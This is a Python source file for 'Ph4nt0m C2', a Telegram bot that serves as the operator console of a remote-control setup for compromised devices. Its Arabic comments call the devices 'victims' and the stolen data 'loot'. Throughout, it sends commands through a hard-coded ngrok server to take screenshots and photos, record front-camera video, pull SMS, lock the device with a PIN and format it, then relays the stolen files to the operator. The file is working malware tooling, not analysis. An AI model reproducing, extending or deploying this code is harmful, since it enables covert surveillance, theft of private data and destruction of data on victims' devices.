#!/usr/bin/env python3
"""
Ph4nt0m C2 Bot - Full Control
"""
import os, json, requests, time, base64
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters

SERVER_URL = "https://d932-2001-16a4-2f8-adf9-ac8c-c4ff-fef6-f51.ngrok-free.app"
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_TOKEN")

ASK_PIN = 1
ASK_NOTIFY = 2

connected_victims = []  # قائمة الضحايا المتصلين
last_loot_time = 0

def send_command(action, params=None):
    try:
        r = requests.post(f"{SERVER_URL}/command", json={"action": action, "params": params or {}}, timeout=10)
        return r.json()
    except:
        return {"status": "error"}

def check_victim_connected():
    """يتحقق إذا كان هناك ضحية متصل"""
    try:
        r = requests.get(f"{SERVER_URL}/", timeout=5)
        return r.status_code == 200
    except:
        return False

def get_new_loot():
    global last_loot_time
    try:
        r = requests.get(f"{SERVER_URL}/loot?since={last_loot_time}", timeout=10)
        data = r.json()
        for item in data.get('loot', []):
            if item['timestamp'] > last_loot_time:
                last_loot_time = item['timestamp']
        return data.get('loot', [])
    except:
        return []

# ========== لوحة البداية (عرض الضحايا) ==========
def victims_keyboard():
    keyboard = []
    if check_victim_connected():
        keyboard.append([InlineKeyboardButton("🖥 الجهاز المتصل", callback_data='select_victim')])
    else:
        keyboard.append([InlineKeyboardButton("❌ لا يوجد أجهزة متصلة", callback_data='no_victim')])
    keyboard.append([InlineKeyboardButton("🔄 تحديث الحالة", callback_data='refresh_status')])
    return InlineKeyboardMarkup(keyboard)

# ========== لوحة التحكم (بعد اختيار الضحية) ==========
def control_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📷 فحص الصور", callback_data='scan_photos'),
         InlineKeyboardButton("📋 معلومات", callback_data='get_info')],
        [InlineKeyboardButton("🖼️ لقطة شاشة", callback_data='screenshot'),
         InlineKeyboardButton("🎥 فيديو امامي", callback_data='record_video')],
        [InlineKeyboardButton("📳 اهتزاز", callback_data='vibrate'),
         InlineKeyboardButton("🔊 صوت", callback_data='play_sound')],
        [InlineKeyboardButton("🔦 فلاش ON", callback_data='flash_on'),
         InlineKeyboardButton("💡 فلاش OFF", callback_data='flash_off')],
        [InlineKeyboardButton("💬 سحب SMS", callback_data='get_sms'),
         InlineKeyboardButton("🔔 إشعار", callback_data='send_notify')],
        [InlineKeyboardButton("🔒 قفل", callback_data='set_pin'),
         InlineKeyboardButton("💣 فرمتة", callback_data='format')],
        [InlineKeyboardButton("📂 عرض المسروقات", callback_data='show_loot')],
        [InlineKeyboardButton("🔙 رجوع", callback_data='back_to_victims')]
    ])

# ========== أوامر البوت ==========
async def start(update, context):
    await update.message.reply_text(
        "⚡ **Ph4nt0m C2**\n\nاضغط على الزر أدناه لعرض الأجهزة المتصلة.",
        reply_markup=victims_keyboard()
    )

async def handle(update, context):
    q = update.callback_query
    await q.answer()
    d = q.data

    # ========== عرض الضحايا ==========
    if d == 'refresh_status' or d == 'back_to_victims' or d == 'no_victim':
        if check_victim_connected():
            await q.edit_message_text("📟 **الأجهزة المتصلة:**\n\n🖥 جهاز واحد متصل", reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🖥 الدخول للجهاز", callback_data='select_victim')],
                [InlineKeyboardButton("🔄 تحديث", callback_data='refresh_status')]
            ]))
        else:
            await q.edit_message_text("❌ لا توجد أجهزة متصلة حالياً.\n\nانتظر اتصال الضحية.", reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 تحديث", callback_data='refresh_status')]
            ]))
        return

    # ========== اختيار الضحية ==========
    if d == 'select_victim':
        if check_victim_connected():
            await q.edit_message_text("✅ **تم الدخول إلى الجهاز**\n\nاختر أمراً من القائمة:", reply_markup=control_keyboard())
        else:
            await q.edit_message_text("❌ الضحية غير متصل الآن.", reply_markup=victims_keyboard())
        return

    # ========== أوامر PIN وإشعار ==========
    if d == 'set_pin':
        await q.edit_message_text("🔢 أرسل PIN (4 أرقام):")
        return ASK_PIN
    if d == 'send_notify':
        await q.edit_message_text("🔔 أرسل نص الإشعار:")
        return ASK_NOTIFY

    # ========== عرض المسروقات ==========
    if d == 'show_loot':
        loot = get_new_loot()
        if not loot:
            await q.edit_message_text("📂 لا توجد مسروقات جديدة.", reply_markup=control_keyboard())
            return
        count = 0
        for item in loot[-5:]:
            if item.get('info'):
                txt = json.dumps(item['info'], ensure_ascii=False)
                await q.message.reply_text(f"📋 **{item.get('type','معلومات')}:**\n{txt[:3000]}")
                count += 1
            elif item.get('data'):
                try:
                    ext = 'png' if item.get('type') in ('screenshot','photo') else 'webm' if item.get('type')=='video' else 'bin'
                    await q.message.reply_document(
                        document=base64.b64decode(item['data']),
                        filename=item.get('name', f'file.{ext}')
                    )
                    count += 1
                except:
                    pass
        if count == 0:
            await q.edit_message_text("📂 لا توجد ملفات قابلة للعرض.", reply_markup=control_keyboard())
        else:
            await q.edit_message_text(f"✅ تم عرض {count} مسروقات.", reply_markup=control_keyboard())
        return

    # ========== الأوامر التنفيذية ==========
    result = send_command(d)
    status = result.get('status', 'error')

    if status in ('ok', 'pending'):
        await q.edit_message_text(f"✅ تم إرسال: {d}\nجاري التنفيذ...", reply_markup=control_keyboard())
        time.sleep(3)
        # عرض المسروقات تلقائياً
        loot = get_new_loot()
        if loot:
            for item in loot[-3:]:
                if item.get('info'):
                    await q.message.reply_text(f"📋 {json.dumps(item['info'], ensure_ascii=False)[:2000]}")
                elif item.get('data'):
                    try:
                        ext = 'png' if item.get('type') in ('screenshot','photo') else 'webm' if item.get('type')=='video' else 'bin'
                        await q.message.reply_document(
                            document=base64.b64decode(item['data']),
                            filename=item.get('name', f'file.{ext}')
                        )
                    except:
                        pass
    else:
        await q.edit_message_text("❌ لا يوجد ضحية متصل. انتظر اتصال الجهاز.", reply_markup=victims_keyboard())

# ========== استقبال PIN ==========
async def pin_input(update, context):
    pin = update.message.text.strip()
    if len(pin) != 4 or not pin.isdigit():
        await update.message.reply_text("❌ يجب أن يكون 4 أرقام:")
        return ASK_PIN
    send_command('lock_screen', {'pin': pin})
    await update.message.reply_text(f"🔒 تم إرسال القفل: {pin}")
    return ConversationHandler.END

# ========== استقبال نص الإشعار ==========
async def notify_input(update, context):
    msg = update.message.text.strip()
    send_command('send_notification', {'message': msg})
    await update.message.reply_text(f"🔔 تم: {msg}")
    return ConversationHandler.END

# ========== تشغيل ==========
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(handle, pattern='^set_pin$'),
            CallbackQueryHandler(handle, pattern='^send_notify$')
        ],
        states={
            ASK_PIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, pin_input)],
            ASK_NOTIFY: [MessageHandler(filters.TEXT & ~filters.COMMAND, notify_input)]
        },
        fallbacks=[]
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle))
    app.add_handler(conv)
    print("🤖 Ph4nt0m Bot Ready")
    app.run_polling()

if __name__ == "__main__":
    main()
